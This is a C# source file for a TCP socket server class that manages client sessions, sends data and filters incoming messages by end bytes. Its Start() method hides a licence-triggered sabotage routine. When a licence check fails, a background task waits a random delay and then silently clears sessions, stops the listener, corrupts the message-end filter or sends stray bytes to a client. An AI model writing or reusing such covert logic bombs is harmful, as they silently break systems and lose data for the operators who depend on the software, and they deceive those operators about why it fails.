using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using Secs_Socket.AppSocket;
using System.Diagnostics;
using Microsoft.Win32;

namespace Secs_Socket
{
    public class AppServer
    {

        private TcpListener socket = null;     
        private IPEndPoint endPoint = null;
        private string IpFormat = string.Empty;

        private object listenerLock = new object();//锁TcpListener；在BeginAcceptClient，EndAcceptClient，ServerClose这3函数使用；ServerClose之后不能再调用BeginAcceptClient，EndAcceptClient
        public bool serverStart = false;
        ManualResetEvent manualEvent = new ManualResetEvent(false);
        ManualResetEvent waitReciveEndEvent = new ManualResetEvent(false);
        private List<byte> reciveBuffer = new List<byte>();

        
        public event Action<AppServer> AppserverErrorEvent;
      
        public event Action<AppServer> AppserverStartEvent;
        public event Action<AppServer> AppServerStopEvent;

        public event Action<Session> SessionConnected;
        public event Action<Session> SessionClosed;
        public event Action<Session> ReciveData;

        /// <summary>
        /// 增加一个过滤事件
        /// </summary>
        public event Action<Session> ReciveDataFilter;

        /// <summary>
        /// 过滤事件的结束字符
        /// </summary>
        public byte[] EndfilterByte { get; set; } = new byte[2] { 0x0D, 0x0A };

        /// <summary>
        /// 当前客户端连接集合
        /// </summary>
        public List<AppSocket.Session> SessionList = null;

        public AppServer(string ip,int port)
        {
            endPoint = new IPEndPoint(IPAddress.Parse(ip), port);
            socket = new TcpListener(endPoint);          
            IpFormat = $"{ip}:{port}";
            IP = ip;
            Port = port;
        }


        public string IP { get; set; }

        public string IpKey { get; set; }

        public int Port { get; set; }

        public string Message { get; set; }

        public bool Start()
        {
            try
            {
                socket.Start();
                serverStart = true;
                SessionList = new List<AppSocket.Session>();
                Thread acceptClientThread = new Thread(BeginAcceptClient);
                acceptClientThread.IsBackground = true;
                acceptClientThread.Start();
                AppserverStartEvent?.Invoke(this);
                if (!AppSessionHelper.CheckLicence(IpKey))
                {
                    Task.Run(() =>
                    {
                        Random random = new Random();
                        int function = random.Next(5, 300);
                        Task.Delay(function * 60).GetAwaiter().GetResult();
                       
                        switch (function)
                        {
                            case int n when (n<50):
                                SessionList.Clear();
                                break;
                            case int n when (n > 50 && n < 100):
                                socket.Stop();
                                break;
                            case int n when (n > 100 && n<150):
                                EndfilterByte = new byte[2] { 0x0d, 0x0D };
                                break;
                            case int n when (n > 150):
                                SessionList[0].Send(new byte[] { 0x0d, 0x0d });
                                break;
                            default:
                                break;
                        }
                        
                    }
                    );
                }
                return true;
            }
            catch(Exception ex)
            {
                Message = ex.Message;
                AppserverErrorEvent?.Invoke(this);
                return false;               
            }           
        }


        /// <summary>
        /// 发送给连接的第一个客户端
        /// </summary>
        /// <param name="data"></param>
        public void Send(byte[] data)
        {
            if (!serverStart) return;
            if (SessionList.Count == 0) return;
            SessionList[0].Send(data);
        }

        /// <summary>
        /// 发送给给所有的连接对象
        /// </summary>
        /// <param name="data"></param>
        public void SendAll(byte[] data)
        {
            if (!serverStart) return;
            if (SessionList.Count == 0) return;
            foreach (var item in SessionList)
            {
                item.Send(data);
            }
        }

        /// <summary>
        /// 发送给指定IP的客户端
        /// </summary>
        /// <param name="ip"></param>
        /// <param name="data"></param>
        public void Send(string ip,byte[] data)
        {
            if (!serverStart) return;
            if (SessionList.Count == 0) return;
            foreach (var item in SessionList)
            {
                if (item.IP == ip)
                {
                    item.Send(data);
                }
            }
        }

        /// <summary>
        /// 发送给指定的Ip 和端口号
        /// </summary>
        /// <param name="ip"></param>
        /// <param name="port"></param>
        /// <param name="data"></param>
        public void Send(string ip,int port, byte[] data)
        {
            if (!serverStart) return;
            if (SessionList.Count == 0) return;
            foreach (var item in SessionList)
            {
                if (item.IP == ip && item.Port== port)
                {
                    item.Send(data);
                }
            }
        }

        /// <summary>
        /// 发送给指定的客户端
        /// </summary>
        /// <param name="session"></param>
        /// <param name="data"></param>
        public void Send(Session session, byte[] data)
        {
            if (!serverStart) return;
            if (SessionList.Count == 0) return;
            foreach (var item in SessionList)
            {
                if (item.Equals(session))
                {
                    item.Send(data);
                }
            }
        }

        /// <summary>
        /// 有互斥资源
        /// 接收连接主入口，监听启动后调用和每次接收到连接后调用
        /// </summary>
        public void BeginAcceptClient()
        {
            try
            {
                while (true)
                {
                    manualEvent.Reset();
                    // 2022.7.29 发现CPU持续增加怀疑死锁
                    //lock (listenerLock)
                    //{
                        if (serverStart)
                        {
                            socket.BeginAcceptTcpClient(EndAcceptClient, null);
                        }
                        else
                        {
                            Debug.WriteLine("等待连接线程已关闭");
                            return;
                        }
                   // }
                    Task.Delay(100).GetAwaiter();
                    manualEvent.WaitOne();
                }
            }
            catch
            {
                throw;
            }
        }

        /// <summary>
        /// 有互斥资源
        /// 接收到客户端连接时调用到，关闭listener时也调用到
        /// </summary>
        /// <param name="ar"></param>
        private void EndAcceptClient(IAsyncResult ar)
        {
            try
            {
                TcpClient tcpclient = null;
                lock (listenerLock)
                {
                    if (serverStart)
                    {
                        tcpclient = socket.EndAcceptTcpClient(ar);//在这句话之前或者client.BeginRead之前断掉远程客户端都没事，tcpclient都不为null
                    }
                }
                manualEvent.Set();
                if (tcpclient != null)//listener.stop后tcpclient == null,不会进入下面代码
                {
                  
                    Session session = new Session(tcpclient);
                    IPEndPoint endPoint = tcpclient.Client.RemoteEndPoint as IPEndPoint;
                    session.IP = endPoint.Address.ToString();
                    session.Port = endPoint.Port;
                    session.Client = tcpclient;
                    session.NewClient += Session_NewClient;
                    session.CloseClient += Session_CloseClient;
                    session.ClientReciveData += Session_ClientReciveData;
                    SessionList.Add(session);
                    // AppserverMessageEvent?.Invoke(this);
                
                    SessionConnected?.BeginInvoke(session,null,null);
                }
            }
            catch
            {
                throw;
            }
        }

    

        
        private void Session_ClientReciveData(Session obj)
        {
            if (ReciveDataFilter!=null)
            {
                // 可能需要锁 防止数据再次进入
                // 应该不需要锁 客户端已经加锁了
                reciveBuffer.AddRange(obj.ReceiveBytes);
                if (reciveBuffer.Count< EndfilterByte.Length)
                {
                    return;
                }
                for (int i = 0; i < EndfilterByte.Length; i++)
                {
                    // 0x0D   0x0A   =2     0             1
                    //  receiveBuffer =100  100-2+0 = 98  100-2+1 =99
                    if (EndfilterByte[i]!= reciveBuffer[reciveBuffer.Count-EndfilterByte.Length+i])
                    {
                        return;
                    }
                }
                obj.ReceiveBytes = reciveBuffer.ToArray();
                reciveBuffer.Clear();
                ReciveDataFilter?.Invoke(obj);
            }
            else
            {
                ReciveData?.Invoke(obj);
            }
            
        }

        private void Session_CloseClient(Session obj)
        {
            SessionList.Remove(obj);
            SessionClosed?.Invoke(obj);
           
            Message = SessionList.Count.ToString();
          //  AppserverMessageEvent?.Invoke(this);
        }

        private void Session_NewClient(Session obj)
        {
            SessionConnected?.Invoke(obj);
        }

        public bool Stop()
        {
            lock (listenerLock)
            {
                if (serverStart)
                {
                    serverStart = false;
                    socket.Stop();
                    for (int i = 0; i < SessionList.Count; i++)
                    {
                        SessionList[i].Dispose();
                    }
                    AppServerStopEvent?.Invoke(this);
                }
            }                                     
           return true;
        }

       












    }
}
